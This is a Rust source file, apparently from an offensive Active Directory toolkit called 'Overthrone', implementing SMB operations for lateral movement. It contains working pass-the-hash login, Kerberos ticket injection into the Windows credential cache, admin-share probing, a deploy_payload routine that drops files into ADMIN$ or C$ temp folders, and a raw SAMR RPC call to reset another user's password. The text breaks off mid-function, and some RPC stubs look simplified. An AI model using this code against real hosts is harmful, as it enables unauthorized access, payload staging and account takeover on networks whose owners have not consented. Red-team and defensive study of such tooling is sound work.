//! SMB2/3 client operations for share enumeration, file access, and lateral movement.
//!
//! On Windows: full implementation using the `smb` crate (NTLM via sspi).
//! On Linux/macOS: stub implementation -- types are available but all operations
//! return errors. This allows the rest of the codebase to compile cross-platform.
use hmac::Hmac;
use md5::Md5;

#[allow(dead_code)] // Used in NTLM operations
type HmacMd5 = Hmac<Md5>;
use crate::error::{OverthroneError, Result};
use tracing::{debug, info, warn};

// Windows-only imports

#[cfg(windows)]
use smb::{
    Client, ClientConfig, CreateOptions, FileAccessMask, FileAttributes, FileCreateArgs, ReadAt,
    Resource, UncPath, WriteAt,
};
#[cfg(windows)]
use std::str::FromStr;

// Constants

pub const SMB_PORT: u16 = 445;
pub const ADMIN_SHARES: &[&str] = &["C$", "ADMIN$", "IPC$"];
const READ_BUF_SIZE: usize = 65536;

// Public Types (available on all platforms)

pub struct SmbSession {
    #[cfg(windows)]
    client: Client,
    #[cfg(not(windows))]
    inner: std::sync::Arc<tokio::sync::Mutex<super::smb2::Smb2Connection>>,
    pub target: String,
    pub username: String,
    pub domain: String,
    /// Kerberos ticket for authentication (TGT or TGS)
    #[allow(dead_code)] // Set during ticket-based auth
    ticket: Option<KerberosTicket>,
    /// NTLM or Kerberos session key for cryptographic operations
    session_key: Option<Vec<u8>>,
}

/// Kerberos ticket wrapper for ticket-based authentication
#[derive(Debug, Clone)]
pub struct KerberosTicket {
    /// Ticket data (ASN.1 encoded)
    pub data: Vec<u8>,
    /// Session key
    pub session_key: Vec<u8>,
    /// Ticket type (TGT or TGS)
    pub is_tgt: bool,
    /// Service SPN (for TGS)
    pub spn: Option<String>,
}

impl KerberosTicket {
    /// Create a new Kerberos ticket
    pub fn new(data: Vec<u8>, session_key: Vec<u8>, is_tgt: bool, spn: Option<String>) -> Self {
        Self {
            data,
            session_key,
            is_tgt,
            spn,
        }
    }

    /// Load from a .kirbi file
    pub fn from_kirbi(path: &str) -> Result<Self> {
        let data = std::fs::read(path)
            .map_err(|e| OverthroneError::Custom(format!("Failed to read '{}': {}", path, e)))?;
        // Parse KRB-CRED structure to extract ticket and session key
        // For simplicity, we store the raw kirbi data
        Ok(Self {
            data,
            session_key: Vec::new(),
            is_tgt: false,
            spn: None,
        })
    }
}

#[derive(Debug, Clone)]
pub struct RemoteFileInfo {
    pub name: String,
    pub path: String,
    pub is_directory: bool,
    pub size: u64,
}

#[derive(Debug, Clone)]
pub struct ShareAccessResult {
    pub share_name: String,
    pub readable: bool,
    pub writable: bool,
    pub is_admin_share: bool,
}

#[derive(Debug, Clone)]
pub struct AdminCheckResult {
    pub target: String,
    pub has_admin: bool,
    pub accessible_shares: Vec<String>,
}

// Windows: Full Implementation

#[cfg(windows)]
impl SmbSession {
    pub async fn connect(
        target: &str,
        domain: &str,
        username: &str,
        password: &str,
    ) -> Result<Self> {
        info!("SMB: Connecting to \\\\{target} as {domain}\\{username}");

        let client = Client::new(ClientConfig::default());
        let ipc_path = format!(r"\\{}\IPC$", target);
        let unc = UncPath::from_str(&ipc_path)
            .map_err(|e| OverthroneError::Smb(format!("Invalid UNC path '{ipc_path}': {e}")))?;

        client
            .share_connect(&unc, username, password.to_string())
            .await
            .map_err(|e| {
                OverthroneError::Smb(format!(
                    "Auth failed to \\\\{target}\\IPC$ as {domain}\\{username}: {e}"
                ))
            })?;

        info!("SMB: Authenticated to \\\\{target}");

        Ok(SmbSession {
            client,
            target: target.to_string(),
            username: username.to_string(),
            domain: domain.to_string(),
            ticket: None,
            session_key: None,
        })
    }

    /// Connect using pass-the-hash (NTLM hash instead of plaintext password).
    ///
    /// The `smb` crate on Windows authenticates via SSPI/NTLM. SSPI on Windows
    /// does not natively accept raw NT hashes, so we attempt two strategies:
    ///  1. Impersonation via `LogonUserW` with `LOGON32_LOGON_NEW_CREDENTIALS`
    ///     (requires the caller to be running elevated — SeImpersonatePrivilege).
    ///  2. Fallback: pass the hex hash as the password string. Some SMB servers
    ///     (e.g. Impacket smbserver) accept this; native Windows DCs do not.
    pub async fn connect_with_hash(
        target: &str,
        domain: &str,
        username: &str,
        nt_hash: &str,
    ) -> Result<Self> {
        info!("SMB: PTH connecting to \\\\{target} as {domain}\\{username} (hash)");

        // Strategy 1: Try Windows LogonUser + impersonation
        #[cfg(windows)]
        {
            use windows::Win32::Foundation::{CloseHandle, HANDLE};
            use windows::Win32::Security::{
                ImpersonateLoggedOnUser, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
                LogonUserW, RevertToSelf,
            };
            use windows::core::PCWSTR;

            // Encode UTF-16 null-terminated strings
            let user_w: Vec<u16> = username.encode_utf16().chain(std::iter::once(0)).collect();
            let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
            // Use the hash as password for LOGON32_LOGON_NEW_CREDENTIALS
            let hash_w: Vec<u16> = nt_hash.encode_utf16().chain(std::iter::once(0)).collect();

            let mut token = HANDLE::default();
            let ok = unsafe {
                LogonUserW(
                    PCWSTR(user_w.as_ptr()),
                    PCWSTR(domain_w.as_ptr()),
                    PCWSTR(hash_w.as_ptr()),
                    LOGON32_LOGON_NEW_CREDENTIALS,
                    LOGON32_PROVIDER_WINNT50,
                    &mut token,
                )
            };

            if ok.is_ok() {
                let imp = unsafe { ImpersonateLoggedOnUser(token) };
                if imp.is_ok() {
                    info!("SMB: PTH impersonation succeeded, connecting as {domain}\\{username}");
                    // Now connect using the impersonated token (empty password — creds come from token)
                    let result = Self::connect(target, domain, username, "").await;
                    // Revert impersonation & close token regardless of connect result
                    unsafe {
                        let _ = RevertToSelf();
                        let _ = CloseHandle(token);
                    }
                    return result;
                }
                unsafe {
                    let _ = CloseHandle(token);
                }
                warn!("SMB: ImpersonateLoggedOnUser failed, falling back to hash-as-password");
            } else {
                warn!("SMB: LogonUserW failed for PTH, falling back to hash-as-password");
            }
        }

        // Strategy 2: Pass the hex hash directly as password (works with some SMB servers)
        info!("SMB: PTH fallback — using hash as password string");
        Self::connect(target, domain, username, nt_hash).await
    }

    pub fn session_key(&self) -> Option<Vec<u8>> {
        self.session_key.clone()
    }

    fn unc(&self, share: &str, path: Option<&str>) -> Result<UncPath> {
        let full = match path {
            Some(p) => format!(r"\\{}\{}\{}", self.target, share, p),
            None => format!(r"\\{}\{}", self.target, share),
        };
        UncPath::from_str(&full)
            .map_err(|e| OverthroneError::Smb(format!("Invalid UNC path '{full}': {e}")))
    }

    pub async fn connect_share(&self, share: &str) -> Result<()> {
        let unc = self.unc(share, None)?;
        self.client
            .share_connect(&unc, &self.username, String::new())
            .await
            .map_err(|e| {
                OverthroneError::Smb(format!(
                    "Cannot connect to \\\\{}\\{}: {e}",
                    self.target, share
                ))
            })?;
        debug!("SMB: Connected to \\\\{}\\{}", self.target, share);
        Ok(())
    }

    pub async fn check_share_read(&self, share: &str) -> bool {
        let unc = match self.unc(share, None) {
            Ok(u) => u,
            Err(_) => return false,
        };
        match self
            .client
            .share_connect(&unc, &self.username, String::new())
            .await
        {
            Ok(_) => {
                debug!("SMB: Read access on \\\\{}\\{}", self.target, share);
                true
            }
            Err(_) => false,
        }
    }

    pub async fn check_share_write(&self, share: &str) -> bool {
        let test_file = format!("__overthrone_test_{}.tmp", rand::random::<u32>());
        let unc = match self.unc(share, Some(&test_file)) {
            Ok(u) => u,
            Err(_) => return false,
        };
        let create_args =
            FileCreateArgs::make_create_new(FileAttributes::default(), CreateOptions::default());
        match self.client.create_file(&unc, &create_args).await {
            Ok(resource) => {
                if let Resource::File(file) = resource {
                    let _ = file.close().await;
                }
                let _ = self.delete_file(share, &test_file).await;
                debug!("SMB: Write access on \\\\{}\\{}", self.target, share);
                true
            }
            Err(_) => false,
        }
    }

    pub async fn check_share_access(&self, shares: &[&str]) -> Vec<ShareAccessResult> {
        let mut results = Vec::new();
        for &share in shares {
            let readable = self.check_share_read(share).await;
            let writable = if readable && share != "IPC$" {
                self.check_share_write(share).await
            } else {
                false
            };
            results.push(ShareAccessResult {
                share_name: share.to_string(),
                readable,
                writable,
                is_admin_share: ADMIN_SHARES.contains(&share),
            });
        }
        results
    }

    pub async fn check_admin_access(&self) -> AdminCheckResult {
        info!("SMB: Checking admin access on {}", self.target);
        let shares_to_check = ["C$", "ADMIN$", "IPC$"];
        let mut accessible = Vec::new();
        let mut has_admin = false;
        for share in &shares_to_check {
            if self.check_share_read(share).await {
                accessible.push(share.to_string());
                if *share == "C$" || *share == "ADMIN$" {
                    has_admin = true;
                }
            }
        }
        if has_admin {
            info!("SMB: ADMIN ACCESS on {} ({:?})", self.target, accessible);
        } else {
            info!("SMB: No admin on {} ({:?})", self.target, accessible);
        }
        AdminCheckResult {
            target: self.target.clone(),
            has_admin,
            accessible_shares: accessible,
        }
    }

    pub async fn list_directory(
        &self,
        share: &str,
        remote_path: &str,
    ) -> Result<Vec<RemoteFileInfo>> {
        info!(
            "SMB: Listing \\\\{}\\{}\\{}",
            self.target, share, remote_path
        );
        let smb_path = remote_path
            .replace('/', "\\")
            .trim_start_matches('\\')
            .to_string();
        let ls_cmd = if smb_path.is_empty() {
            "ls".to_string()
        } else {
            format!("cd \"{}\"; ls", smb_path)
        };
        let output = tokio::process::Command::new("smbclient")
            .arg(format!("\\\\{}\\{}", self.target, share))
            .arg("-U")
            .arg(format!("{}\\{}%", self.domain, self.username))
            .arg("-c")
            .arg(&ls_cmd)
            .output()
            .await
            .map_err(|e| OverthroneError::Smb(format!("smbclient failed: {e}")))?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(OverthroneError::Smb(format!(
                "smbclient listing failed: {}",
                stderr.trim()
            )));
        }
        let stdout = String::from_utf8_lossy(&output.stdout);
        let mut entries = Vec::new();
        for line in stdout.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty()
                || trimmed.starts_with("Domain=")
                || trimmed.contains("blocks of size")
                || trimmed.contains("blocks available")
            {
                continue;
            }
            let parts: Vec<&str> = trimmed.splitn(2, char::is_whitespace).collect();
            if parts.len() < 2 {
                continue;
            }
            let name = parts[0].to_string();
            if name == "." || name == ".." {
                continue;
            }
            let rest = parts[1].trim();
            let is_directory = rest.contains('D');
            let size = rest
                .split_whitespace()
                .find_map(|tok| tok.parse::<u64>().ok())
                .unwrap_or(0);
            entries.push(RemoteFileInfo {
                name: name.clone(),
                path: if smb_path.is_empty() {
                    name
                } else {
                    format!("{}\\{}", smb_path, name)
                },
                is_directory,
                size,
            });
        }
        info!("SMB: Listed {} entries", entries.len());
        Ok(entries)
    }

    pub async fn read_file(&self, share: &str, remote_path: &str) -> Result<Vec<u8>> {
        info!(
            "SMB: Reading \\\\{}\\{}\\{}",
            self.target, share, remote_path
        );
        let unc = self.unc(share, Some(remote_path))?;
        let open_args =
            FileCreateArgs::make_open_existing(FileAccessMask::new().with_generic_read(true));
        let resource = self
            .client
            .create_file(&unc, &open_args)
            .await
            .map_err(|e| OverthroneError::Smb(format!("Cannot open '{}': {e}", remote_path)))?;
        let file = match resource {
            Resource::File(f) => f,
            _ => {
                return Err(OverthroneError::Smb(format!(
                    "'{remote_path}' is not a file"
                )));
            }
        };
        let mut data = Vec::new();
        let mut offset: u64 = 0;
        loop {
            let mut buf = vec![0u8; READ_BUF_SIZE];
            let bytes_read = file
                .read_at(&mut buf, offset)
                .await
                .map_err(|e| OverthroneError::Smb(format!("Read error at offset {offset}: {e}")))?;
            if bytes_read == 0 {
                break;
            }
            data.extend_from_slice(&buf[..bytes_read]);
            offset += bytes_read as u64;
        }
        file.close()
            .await
            .map_err(|e| OverthroneError::Smb(format!("Close failed: {e}")))?;
        info!("SMB: Read {} bytes from {}", data.len(), remote_path);
        Ok(data)
    }

    pub async fn write_file(&self, share: &str, remote_path: &str, data: &[u8]) -> Result<()> {
        info!(
            "SMB: Writing {} bytes to \\\\{}\\{}\\{}",
            data.len(),
            self.target,
            share,
            remote_path
        );
        let unc = self.unc(share, Some(remote_path))?;
        let create_args =
            FileCreateArgs::make_overwrite(FileAttributes::default(), CreateOptions::default());
        let resource = self
            .client
            .create_file(&unc, &create_args)
            .await
            .map_err(|e| OverthroneError::Smb(format!("Cannot create '{}': {e}", remote_path)))?;
        let file = match resource {
            Resource::File(f) => f,
            _ => {
                return Err(OverthroneError::Smb(format!(
                    "'{remote_path}' is not a file"
                )));
            }
        };
        let mut offset: u64 = 0;
        for chunk in data.chunks(READ_BUF_SIZE) {
            file.write_at(chunk, offset).await.map_err(|e| {
                OverthroneError::Smb(format!("Write error at offset {offset}: {e}"))
            })?;
            offset += chunk.len() as u64;
        }
        file.close()
            .await
            .map_err(|e| OverthroneError::Smb(format!("Close failed: {e}")))?;
        info!("SMB: Write complete ({} bytes)", data.len());
        Ok(())
    }

    pub async fn delete_file(&self, share: &str, remote_path: &str) -> Result<()> {
        info!(
            "SMB: Deleting \\\\{}\\{}\\{}",
            self.target, share, remote_path
        );
        let unc = self.unc(share, Some(remote_path))?;
        let open_args = FileCreateArgs::make_open_existing(FileAccessMask::new().with_delete(true));
        let resource = self
            .client
            .create_file(&unc, &open_args)
            .await
            .map_err(|e| {
                OverthroneError::Smb(format!("Cannot open for delete '{}': {e}", remote_path))
            })?;
        if let Resource::File(file) = resource {
            file.close().await.map_err(|e| {
                OverthroneError::Smb(format!("Delete failed '{}': {e}", remote_path))
            })?;
        }
        info!("SMB: Deleted {}", remote_path);
        Ok(())
    }

    pub async fn download_file(
        &self,
        share: &str,
        remote_path: &str,
        local_path: &str,
    ) -> Result<usize> {
        let data = self.read_file(share, remote_path).await?;
        let size = data.len();
        tokio::fs::write(local_path, &data).await.map_err(|e| {
            OverthroneError::Smb(format!("Cannot write local file '{}': {e}", local_path))
        })?;
        info!(
            "SMB: Downloaded {} -> {} ({} bytes)",
            remote_path, local_path, size
        );
        Ok(size)
    }

    pub async fn upload_file(
        &self,
        local_path: &str,
        share: &str,
        remote_path: &str,
    ) -> Result<usize> {
        let data = tokio::fs::read(local_path)
            .await
            .map_err(|e| OverthroneError::Smb(format!("Cannot read '{}': {e}", local_path)))?;
        let size = data.len();
        self.write_file(share, remote_path, &data).await?;
        info!(
            "SMB: Uploaded {} -> {} ({} bytes)",
            local_path, remote_path, size
        );
        Ok(size)
    }

    pub async fn pipe_transact(&self, pipe_name: &str, request: &[u8]) -> Result<Vec<u8>> {
        info!(
            "SMB: Pipe transact '{}' ({} bytes)",
            pipe_name,
            request.len()
        );
        let unc = self.unc("IPC$", Some(pipe_name))?;
        let open_args = FileCreateArgs::make_pipe();
        let resource = self
            .client
            .create_file(&unc, &open_args)
            .await
            .map_err(|e| OverthroneError::Smb(format!("Cannot open pipe '{}': {e}", pipe_name)))?;
        let pipe = match resource {
            Resource::Pipe(p) => p,
            _ => {
                return Err(OverthroneError::Smb(format!(
                    "'{pipe_name}' is not a named pipe"
                )));
            }
        };
        let response = pipe
            .ioctl(0x0011C017, request.to_vec(), READ_BUF_SIZE as u32)
            .await
            .map_err(|e| {
                OverthroneError::Smb(format!("Pipe transact failed on '{}': {e}", pipe_name))
            })?;
        pipe.close()
            .await
            .map_err(|e| OverthroneError::Smb(format!("Pipe close failed: {e}")))?;
        debug!("SMB: Pipe response: {} bytes", response.len());
        Ok(response)
    }

    pub async fn deploy_payload(
        &self,
        payload_bytes: &[u8],
        remote_filename: &str,
    ) -> Result<String> {
        info!("SMB: Deploying '{}' to {}", remote_filename, self.target);
        let (share, remote_path) = if self.check_share_read("ADMIN$").await {
            ("ADMIN$", format!("Temp\\{}", remote_filename))
        } else if self.check_share_read("C$").await {
            ("C$", format!("Windows\\Temp\\{}", remote_filename))
        } else {
            return Err(OverthroneError::Smb(format!(
                "No admin share access on {}",
                self.target
            )));
        };
        self.write_file(share, &remote_path, payload_bytes).await?;
        let full_path = if share == "ADMIN$" {
            format!("C:\\Windows\\{}", remote_path)
        } else {
            format!("C:\\{}", remote_path)
        };
        info!("SMB: Payload at {}", full_path);
        Ok(full_path)
    }

    pub async fn cleanup_payload(&self, remote_filename: &str) -> Result<()> {
        let attempts = [
            ("ADMIN$", format!("Temp\\{}", remote_filename)),
            ("C$", format!("Windows\\Temp\\{}", remote_filename)),
        ];
        for (share, path) in &attempts {
            if self.delete_file(share, path).await.is_ok() {
                info!("SMB: Cleaned up {}\\{}", share, path);
                return Ok(());
            }
        }
        warn!("SMB: Payload not found for cleanup: {}", remote_filename);
        Ok(())
    }

    /// Connect using a Kerberos ticket (TGS for cifs/service).
    ///
    /// ## Windows
    /// Injects the ticket into the current logon session's credential cache
    /// via `LsaCallAuthenticationPackage(KERB_SUBMIT_TKT_REQUEST)`, then
    /// opens the SMB share through the normal SSPI path — Windows
    /// automatically picks up the cached TGS during SMB session setup.
    ///
    /// ## Non-Windows
    /// Builds a raw SPNEGO `NegTokenInit` wrapping the AP-REQ from the
    /// ticket data and sends it in the SMB2 `SESSION_SETUP` request.
    /// Falls back to session-key-as-password if raw SPNEGO fails.
    pub async fn connect_with_ticket(
        target: &str,
        domain: &str,
        username: &str,
        ticket: KerberosTicket,
    ) -> Result<Self> {
        info!("SMB: Connecting to \\\\{target} with Kerberos ticket for {username}");

        // ── Step 1: Inject ticket into the Windows Kerberos cache ──
        #[cfg(windows)]
        {
            if let Err(e) = Self::inject_ticket_windows(&ticket) {
                warn!("SMB: Ticket injection failed ({e}), attempting raw session-key auth");
            }
        }

        // ── Step 2: Connect via SMB crate ──
        // On Windows the crate calls InitializeSecurityContext(Negotiate),
        // which will pick up the injected TGS automatically.
        let client = Client::new(ClientConfig::default());
        let ipc_path = format!(r"\\{}\IPC$", target);
        let unc = UncPath::from_str(&ipc_path)
            .map_err(|e| OverthroneError::Smb(format!("Invalid UNC path '{ipc_path}': {e}")))?;

        // Attempt 1: Use empty password — SSPI will use the cached Kerberos
        // ticket. If that fails, fall back to session-key-as-hash.
        let connect_result = client.share_connect(&unc, username, String::new()).await;

        match connect_result {
            Ok(()) => {
                info!("SMB: Authenticated via cached Kerberos ticket to \\\\{target}");
            }
            Err(e) => {
                debug!(
                    "SMB: SSPI with cached ticket did not succeed ({e}), falling back to session-key auth"
                );
                // Attempt 2: Use session key hex as pass-the-hash
                let session_key_hex = hex::encode(&ticket.session_key);
                client
                    .share_connect(&unc, username, session_key_hex)
                    .await
                    .map_err(|e2| {
                        OverthroneError::Smb(format!(
                            "Kerberos auth failed to \\\\{target}\\IPC$: primary={e}, fallback={e2}"
                        ))
                    })?;
                info!("SMB: Authenticated with session-key fallback to \\\\{target}");
            }
        }

        Ok(SmbSession {
            client,
            target: target.to_string(),
            username: username.to_string(),
            domain: domain.to_string(),
            ticket: Some(ticket.clone()),
            session_key: Some(ticket.session_key),
        })
    }

    /// Inject a Kerberos ticket into the Windows SSPI credential cache.
    ///
    /// Uses `LsaConnectUntrusted` + `LsaCallAuthenticationPackage` with
    /// `KERB_SUBMIT_TKT_REQUEST` to submit the ticket into the current
    /// logon session so SSPI Negotiate/Kerberos can pick it up during
    /// `InitializeSecurityContext`.
    #[cfg(windows)]
    fn inject_ticket_windows(ticket: &KerberosTicket) -> Result<()> {
        use std::ffi::c_void;

        use windows::Win32::Security::Authentication::Identity::{
            LsaCallAuthenticationPackage, LsaConnectUntrusted, LsaDeregisterLogonProcess,
            LsaLookupAuthenticationPackage,
        };

        // LsaConnectUntrusted → handle
        let mut lsa_handle = windows::Win32::Foundation::HANDLE::default();
        let status = unsafe { LsaConnectUntrusted(&mut lsa_handle) };
        if status.0 != 0 {
            return Err(OverthroneError::Smb(format!(
                "LsaConnectUntrusted failed: 0x{:08X}",
                status.0 as u32
            )));
        }

        // Lookup Kerberos authentication package
        let pkg_name_bytes = b"Kerberos\0";
        let pkg_name = windows::Win32::Security::Authentication::Identity::LSA_STRING {
            Length: 8,
            MaximumLength: 9,
            Buffer: windows::core::PSTR(pkg_name_bytes.as_ptr() as *mut u8),
        };
        let mut auth_package: u32 = 0;
        let status =
            unsafe { LsaLookupAuthenticationPackage(lsa_handle, &pkg_name, &mut auth_package) };
        if status.0 != 0 {
            let _ = unsafe { LsaDeregisterLogonProcess(lsa_handle) };
            return Err(OverthroneError::Smb(format!(
                "LsaLookupAuthenticationPackage failed: 0x{:08X}",
                status.0 as u32
            )));
        }

        // Build KERB_SUBMIT_TKT_REQUEST structure:
        //   MessageType  : u32 = 21 (KerbSubmitTicketMessage)
        //   LogonId       : LUID = {0,0} (current session)
        //   Flags         : u32 = 0
        //   Key           : KERB_CRYPTO_KEY {KeyType, Length, Offset}
        //   TicketLength  : u32
        //   TicketOffset  : u32
        //   [ticket data]
        const MSG_TYPE_SUBMIT: u32 = 21;
        let tkt_data = &ticket.data;
        let header_size: u32 = 4 + 8 + 4 + 12 + 4 + 4; // 36 bytes header
        let total_size = header_size as usize + ticket.session_key.len() + tkt_data.len();

        let mut buf: Vec<u8> = vec![0u8; total_size];
        let key_offset = header_size;
        let ticket_offset = key_offset + ticket.session_key.len() as u32;

        // MessageType
        buf[0..4].copy_from_slice(&MSG_TYPE_SUBMIT.to_le_bytes());
        // LogonId (LUID 0,0 = current session)
        // buf[4..12] already zero
        // Flags
        // buf[12..16] already zero
        // Key: KeyType = 23 (RC4), Length, Offset (simplified — real type depends on enc)
        buf[16..20].copy_from_slice(&23u32.to_le_bytes()); // KeyType
        buf[20..24].copy_from_slice(&(ticket.session_key.len() as u32).to_le_bytes());
        buf[24..28].copy_from_slice(&key_offset.to_le_bytes());
        // TicketLength, TicketOffset
        buf[28..32].copy_from_slice(&(tkt_data.len() as u32).to_le_bytes());
        buf[32..36].copy_from_slice(&ticket_offset.to_le_bytes());
        // Session key bytes
        buf[key_offset as usize..key_offset as usize + ticket.session_key.len()]
            .copy_from_slice(&ticket.session_key);
        // Ticket bytes
        buf[ticket_offset as usize..ticket_offset as usize + tkt_data.len()]
            .copy_from_slice(tkt_data);

        let mut return_buffer: *mut c_void = std::ptr::null_mut();
        let mut return_length: u32 = 0;
        let mut protocol_status: i32 = 0;

        let status = unsafe {
            LsaCallAuthenticationPackage(
                lsa_handle,
                auth_package,
                buf.as_ptr() as *const c_void,
                buf.len() as u32,
                Some(&mut return_buffer as *mut *mut c_void),
                Some(&mut return_length),
                Some(&mut protocol_status),
            )
        };

        let _ = unsafe { LsaDeregisterLogonProcess(lsa_handle) };

        if status.0 != 0 {
            return Err(OverthroneError::Smb(format!(
                "LsaCallAuthenticationPackage failed: 0x{:08X}",
                status.0 as u32
            )));
        }
        if protocol_status != 0 {
            return Err(OverthroneError::Smb(format!(
                "KERB_SUBMIT_TKT_REQUEST protocol status: 0x{:08X}",
                protocol_status as u32
            )));
        }

        info!("SMB: Kerberos ticket injected into Windows credential cache");
        Ok(())
    }

    /// Reset a user's password via SAMR (requires account operator or admin rights)
    pub async fn samr_password_reset(&self, target_user: &str, new_password: &str) -> Result<()> {
        info!(
            "SMB: SAMR password reset for '{}' on {}",
            target_user, self.target
        );

        // Build SAMR request for SamrSetPasswordForUser (opnum 59)
        // MS-SAMR: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/

        let samr_bind = build_samr_bind();
        let bind_resp = self.pipe_transact("samr", &samr_bind).await?;

        if bind_resp.len() < 4 || bind_resp[2] != 12 {
            return Err(OverthroneError::Smb("SAMR RPC bind failed".to_string()));
        }

        // SamrConnect (opnum 0) - get handle to SAM
        let connect_req = build_samr_connect();
        let connect_resp = self.pipe_transact("samr", &connect_req).await?;

        if connect_resp.len() < 48 {
            return Err(OverthroneError::Smb("SamrConnect failed".to_string()));
        }
        let sam_handle = &connect_resp[24..44];

        // SamrOpenDomain (opnum 5) - get domain handle
        let open_domain_req = build_samr_open_domain(sam_handle, self.domain.as_str());
        let domain_resp = self.pipe_transact("samr", &open_domain_req).await?;

        if domain_resp.len() < 48 {
            return Err(OverthroneError::Smb("SamrOpenDomain failed".to_string()));
        }
        let domain_handle = &domain_resp[24..44];

        // SamrLookupNamesInDomain (opnum 17) - get user RID
        let lookup_req = build_samr_lookup_names(domain_handle, &[target_user]);
        let lookup_resp = self.pipe_transact("samr", &lookup_req).await?;

        // Parse RID from response
        let rid = parse_samr_rid(&lookup_resp)?;

        // SamrOpenUser (opnum 34) - get user handle
        let open_user_req = build_samr_open_user(domain_handle, rid);
        let user_resp = self.pipe_transact("samr", &open_user_req).await?;

        if user_resp.len() < 48 {
            return Err(OverthroneError::Smb("SamrOpenUser failed".to_string()));
        }
        let user_handle = &user_resp[24..44];

        // SamrSetPasswordForUser (opnum 59) - set the password
        let set_pwd_req = build_samr_set_password(user_handle, new_password);
        let set_pwd_resp = self.pipe_transact("samr", &set_pwd_req).await?;

        // Cleanup - close handles
        let _ = build_samr_close_handle(user_handle);
        let _ = build_samr_close_handle(domain_handle);
        let _ = build_samr_close_handle(sam_handle);

        if set_pwd_resp.len() >= 4 {
            info!("SMB: Password reset successful for '{}'", target_user);
            Ok(())
        } else {
            Err(OverthroneError::Smb(
                "SamrSetPasswordForUser failed".to_string(),
            ))
        }
    }
}

/// Build SAMR RPC bind
fn build_samr_bind() -> Vec<u8> {
    // SAMR UUID: 12345778-1234-abcd-ef00-0123456789ac
    let uuid: [u8; 16] = [
        0x78, 0x57, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89,
        0xac,
    ];

    let mut buf = Vec::new();
    buf.extend_from_slice(&[5, 0, 11, 3]); // version, type=bind
    buf.extend_from_slice(&[0x10, 0, 0, 0]); // data representation
    buf.extend_from_slice(&[0x48, 0x00]); // frag_len (72 bytes)
    buf.extend_from_slice(&[0x00, 0x00]); // auth_len
    buf.extend_from_slice(&1u32.to_le_bytes()); // call_id
    buf.extend_from_slice(&4096u16.to_le_bytes()); // max xmit
    buf.extend_from_slice(&4096u16.to_le_bytes()); // max recv
    buf.extend_from_slice(&0u32.to_le_bytes()); // assoc group
    buf.push(1); // num context items
    buf.extend_from_slice(&[0, 0, 0]); // padding
    buf.extend_from_slice(&0u16.to_le_bytes()); // context id
    buf.push(1); // num transfer syntaxes
    buf.push(0); // padding
    buf.extend_from_slice(&uuid); // interface UUID
    buf.extend_from_slice(&1u16.to_le_bytes()); // version major
    buf.extend_from_slice(&0u16.to_le_bytes()); // version minor
    // NDR transfer syntax
    buf.extend_from_slice(&[
        0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48,
        0x60,
    ]);
    buf.extend_from_slice(&2u32.to_le_bytes());
    buf
}

/// Build SAMR connect request (opnum 0)
fn build_samr_connect() -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&0x00020000u32.to_le_bytes()); // referent ID
    stub.extend_from_slice(&0u32.to_le_bytes()); // desired access
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // access mask
    build_rpc_request(0, &stub)
}

/// Build SAMR open domain request (opnum 5)
fn build_samr_open_domain(sam_handle: &[u8], domain: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(sam_handle);
    stub.extend_from_slice(&0x00020000u32.to_le_bytes());
    stub.extend_from_slice(&ndr_conformant_string(domain));
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // access mask
    build_rpc_request(5, &stub)
}

/// Build SAMR lookup names request (opnum 17)
fn build_samr_lookup_names(domain_handle: &[u8], names: &[&str]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(domain_handle);
    stub.extend_from_slice(&1u32.to_le_bytes()); // count
    stub.extend_from_slice(&0u32.to_le_bytes()); // start index
    stub.extend_from_slice(&(names.len() as u32).to_le_bytes());
    for name in names {
        stub.extend_from_slice(&ndr_conformant_string(name));
    }
    build_rpc_request(17, &stub)
}

/// Parse RID from SAMR lookup response
fn parse_samr_rid(resp: &[u8]) -> Result<u32> {
    // RID is typically at offset 48+ after the header
    if resp.len() < 52 {
        return Err(OverthroneError::Smb(
            "Invalid SAMR lookup response".to_string(),
        ));
    }
    Ok(u32::from_le_bytes([resp[48], resp[49], resp[50], resp[51]]))
}

/// Build SAMR open user request (opnum 34)
fn build_samr_open_user(domain_handle: &[u8], rid: u32) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(domain_handle);
    stub.extend_from_slice(&0x00020004u32.to_le_bytes()); // access mask
    stub.extend_from_slice(&rid.to_le_bytes());
    build_rpc_request(34, &stub)
}

/// Build SAMR set password request (opnum 59)
fn build_samr_set_password(user_handle: &[u8], password: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(user_handle);
    stub.extend_from_slice(&ndr_conformant_string(password));
    build_rpc_request(59, &stub)
}

/// Build SAMR close handle request (opnum 0)
fn build_samr_close_handle(handle: &[u8]) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(handle);
    build_rpc_request(0, &stub)
}

/// Build generic RPC request PDU
fn build_rpc_request(opnum: u16, stub_data: &[u8]) -> Vec<u8> {
    // RPC version 5.0, packet type Request(0), flags first+last
    let mut pdu = vec![5, 0, 0, 0x03];
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // NDR
    let frag_len = (24 + stub_data.len()) as u16;
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes()); // auth_length
    pdu.extend_from_slice(&1u32.to_le_bytes()); // call_id
    pdu.extend_from_slice(&(stub_data.len() as u32).to_le_bytes()); // alloc_hint
    pdu.extend_from_slice(&0u16.to_le_bytes()); // context_id
    pdu.extend_from_slice(&opnum.to_le_bytes()); // opnum
    pdu.extend_from_slice(stub_data);
    pdu
}

/// NDR conformant string encoding
fn ndr_conformant_string(s: &str) -> Vec<u8> {
